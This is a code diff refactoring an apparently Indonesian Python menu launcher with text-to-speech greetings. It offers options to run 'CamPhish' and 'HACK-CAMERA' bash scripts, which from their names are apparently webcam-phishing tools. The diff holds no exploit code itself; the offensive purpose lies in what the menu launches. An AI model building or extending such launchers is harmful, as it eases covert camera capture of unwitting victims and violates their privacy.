@@ -5,7 +5,7 @@ import subprocess
 import platform
 from colorama import init, Fore, Style
 
-# import modul TTS dulu sebelum fungsi run_speak() dipanggil
+# Optional TTS imports
 try:
     import win32com.client
 except ImportError:
@@ -16,49 +16,10 @@ try:
 except ImportError:
     pyttsx3 = None
 
-# Inisialisasi Colorama
+# Initialize Colorama
 init(autoreset=True)
 
-# ... definisi warna dan LOGO ...
-
-def run_speak(text, rate=0, volume=1.0):
-    try:
-        system_os = platform.system()
-
-        if system_os == "Windows":
-            if win32com is None:
-                print("Module win32com.client tidak ditemukan. TTS Windows tidak dapat dijalankan.")
-                return
-            speaker = win32com.client.Dispatch("SAPI.SpVoice")
-            speaker.Rate = rate
-            speaker.Volume = int(volume * 100)
-            speaker.Speak(text)
-
-        else:
-            if pyttsx3 is None:
-                print("Module pyttsx3 tidak ditemukan. TTS Linux/macOS tidak dapat dijalankan.")
-                return
-            engine = pyttsx3.init()
-            engine.setProperty('rate', 150 + (rate * 10))
-            engine.setProperty('volume', volume)
-            engine.say(text)
-            engine.runAndWait()
-
-    except Exception as e:
-        print("Text-to-speech error:", e)
-
-# Baru panggil run_speak setelah modul import selesai
-run_speak("Welcome to the program!", rate=0, volume=1.0)
-run_speak("My name is SomniumN1, I am a programmer", rate=1, volume=1.0)
-
-# ... sisa kode kamu ...
-# launcher.py
-
-# Inisialisasi Colorama
-# autoreset=True akan otomatis mengembalikan warna ke default setelah setiap print()
-init(autoreset=True)
-
-# Mendefinisikan warna menggunakan Colorama agar cross-platform
+# Color definitions
 RED = Fore.RED
 GREEN = Fore.GREEN
 YELLOW = Fore.YELLOW
@@ -68,11 +29,10 @@ CYAN = Fore.CYAN
 WHITE = Fore.WHITE
 RESET = Style.RESET_ALL
 
-# Simpan direktori awal
-CWD = os.getcwd()
+# Store initial working directory
+INITIAL_DIR = os.getcwd()
 
-# FIX 1: Menambahkan 'r' di depan string untuk menjadikannya "raw string".
-# Ini akan memperbaiki semua 'SyntaxWarning: invalid escape sequence'.
+# Logo displayed in main menu
 LOGO = r"""
 {BLUE}   _   _    _    ____ _  __      ____    _    __  __ _____ ____      _   
 {BLUE}  | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \  
@@ -81,120 +41,96 @@ LOGO = r"""
 {BLUE}  |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
 
 {GREEN}                             [By X PHANTOM (PH4N7OM)]
-
 {RED}                               [By SomniumN1 (Ashera12)]
-
 {GREEN}   The lady.....  ..              >> BiLaNazmi<< [SomniumN1]
 """
 
+def run_tts(text, rate=0, volume=1.0):
+    try:
+        system_os = platform.system()
+        if system_os == "Windows" and win32com:
+            speaker = win32com.client.Dispatch("SAPI.SpVoice")
+            speaker.Rate = rate
+            speaker.Volume = int(volume * 100)
+            speaker.Speak(text)
+        elif pyttsx3:
+            engine = pyttsx3.init()
+            engine.setProperty('rate', 150 + rate * 10)
+            engine.setProperty('volume', volume)
+            engine.say(text)
+            engine.runAndWait()
+            engine.stop()
+        else:
+            print(f"{YELLOW}TTS tidak tersedia di sistem ini.")
+    except Exception as e:
+        print(f"{RED}Text-to-speech error: {e}")
+
 def clear_screen():
-    """Membersihkan layar terminal, berfungsi di Windows, macOS, dan Linux."""
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def display_menu():
-    """Menampilkan logo dan menu pilihan."""
-    # Menggunakan .format() untuk memasukkan variabel warna ke dalam raw string
+def show_menu():
+    clear_screen()
     print(LOGO.format(BLUE=BLUE, GREEN=GREEN, RED=RED))
     print(f"{CYAN}[1]{WHITE} CamPhish V1")
     print(f"{CYAN}[2]{WHITE} CamPhish V2")
     print(f"{CYAN}[0]{WHITE} Exit")
 
-def run_command(command_list):
-    """Menjalankan perintah eksternal dengan subprocess."""
+def execute_command(command):
     try:
-        subprocess.run(command_list, check=True)
+        subprocess.run(command, check=True)
     except FileNotFoundError:
-        print(f"{RED}Error: Perintah '{command_list[0]}' tidak ditemukan.")
-        print(f"{YELLOW}Di Windows, pastikan 'bash' terinstal (misal dari Git Bash) dan ada di PATH sistem.")
-        time.sleep(4)
+        print(f"{RED}Perintah '{command[0]}' tidak ditemukan.")
+        time.sleep(3)
     except subprocess.CalledProcessError as e:
-        print(f"{RED}Error saat menjalankan skrip: {e}")
+        print(f"{RED}Gagal menjalankan perintah: {e}")
         time.sleep(3)
     except Exception as e:
-        print(f"{RED}Terjadi kesalahan tak terduga: {e}")
+        print(f"{RED}Kesalahan tidak terduga: {e}")
         time.sleep(3)
 
-def run_camphish_v1():
-    """Fungsi untuk menjalankan CamPhish V1."""
+def run_camphish(folder, script):
     clear_screen()
-    print(f"{WHITE}Starting CamPhish V1...")
-    time.sleep(3)
-    
+    print(f"{WHITE}Menjalankan {folder}...")
+    time.sleep(2)
     try:
-        os.chdir("CamPhish")
+        os.chdir(folder)
         clear_screen()
-        print(f"{MAGENTA}SOMNIUMN1 >>BILANAZMI<< ( ASHERA12 )")
-        time.sleep(3)
-        
-        print(f"{YELLOW}Menjalankan 'bash camphish.sh'...")
-        run_command(['bash', 'camphish.sh'])
-
+        print(f"{MAGENTA}Loading tools...")
+        time.sleep(2)
+        execute_command(['bash', script])
     except FileNotFoundError:
-        print(f"{RED}Error: Direktori 'CamPhish' tidak ditemukan.")
-        print(f"{YELLOW}Pastikan skrip ini berada di direktori yang sama dengan folder 'CamPhish'.")
-        time.sleep(4)
-    finally:
-        os.chdir(CWD)
-
-def run_camphish_v2():
-    """Fungsi untuk menjalankan CamPhish V2."""
-    clear_screen()
-    print(f"{MAGENTA}Starting CamPhish V2...")
-    time.sleep(3)
-
-    try:
-        os.chdir("HACK-CAMERA")
-        clear_screen()
-        print(f"{MAGENTA}Installing The Tools...")
+        print(f"{RED}Folder '{folder}' tidak ditemukan.")
         time.sleep(3)
-
-        print(f"{YELLOW}Menjalankan setup...")
-        run_command(['bash', 'setup'])
-        
-        clear_screen()
-        print(f"{MAGENTA}SOMNIUMN1 THAT'S NAME I LIKE")
-        time.sleep(3)
-        
-        print(f"{YELLOW}Menjalankan 'bash hack_camera.sh'...")
-        run_command(['bash', 'hack_camera.sh'])
-
-    except FileNotFoundError:
-        print(f"{RED}Error: Direktori 'HACK-CAMERA' tidak ditemukan.")
-        print(f"{YELLOW}Pastikan skrip ini berada di direktori yang sama dengan folder 'HACK-CAMERA'.")
-        time.sleep(4)
     finally:
-        os.chdir(CWD)
+        os.chdir(INITIAL_DIR)
 
 def main():
-    """Fungsi utama program."""
-    # FIX 2: Memastikan struktur try/except ini benar untuk menghindari SyntaxError.
-    while True:
-        clear_screen()
-        display_menu()
-        
-        try:
-            choice = input(f"{YELLOW}Choose: {RESET}")
+    run_tts("Welcome to the program!", rate=0)
+    run_tts("My name is SomniumN1, I am a programmer", rate=1)
+    time.sleep(1.5)  # Pastikan TTS selesai sebelum melanjutkan
 
+    while True:
+        show_menu()
+        try:
+            choice = input(f"{YELLOW}Pilih opsi: {RESET}")
             if choice == '1':
-                run_camphish_v1()
-                input(f"\n{GREEN}Eksekusi selesai. Tekan Enter untuk kembali ke menu utama...")
+                run_camphish("CamPhish", "camphish.sh")
+                input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
             elif choice == '2':
-                run_camphish_v2()
-                input(f"\n{GREEN}Eksekusi selesai. Tekan Enter untuk kembali ke menu utama...")
+                run_camphish("HACK-CAMERA", "hack_camera.sh")
+                input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
             elif choice == '0':
                 clear_screen()
                 print(f"{CYAN}JUST HOPING TO BE HER HOPE :)")
                 time.sleep(1)
-                sys.exit(0) # Keluar dari program
+                sys.exit(0)
             else:
-                print(f"{RED}Pilihan tidak valid, silakan coba lagi.")
+                print(f"{RED}Input tidak valid. Coba lagi.")
                 time.sleep(2)
-        
         except KeyboardInterrupt:
-             clear_screen()
-             print(f"\n{CYAN}Program dihentikan oleh pengguna. Sampai jumpa!")
-             sys.exit(0)
+            clear_screen()
+            print(f"\n{CYAN}Program dihentikan. Sampai jumpa!")
+            sys.exit(0)
 
-# Baris ini memastikan fungsi main() hanya berjalan saat file dieksekusi sebagai skrip
 if __name__ == "__main__":
     main()
